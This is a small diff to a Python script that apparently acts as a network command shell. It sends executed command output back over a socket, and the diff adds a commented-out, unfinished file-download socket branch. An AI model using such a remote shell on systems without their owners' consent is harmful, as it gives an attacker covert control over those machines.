@@ -41,8 +41,21 @@ while 1:
             connection_socket.send(stdout_value)
         if exec_code == "quit":
             break
+        #if exec_code == "get":
+         #   tmp_socket = socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
+          #  tmp_socket.bind(('',0))
+           # print(tmp_socket.getsockname())
+            #connection_socket.send(tmp_socket.getsockname())
+            #while 1:
+             #   try:
+              #      tmp_cmd = tmp_socket.recv(1024)
+               #     if tmp_cmd == 'close':
+                #        tmp_socket.close()
+                 #       print("Download Socket Closed")
+                #except:
+                 #   pass
     except:
-            pass
+        pass
 #    print("waiting")
 #
 #    tmpBuff= ''
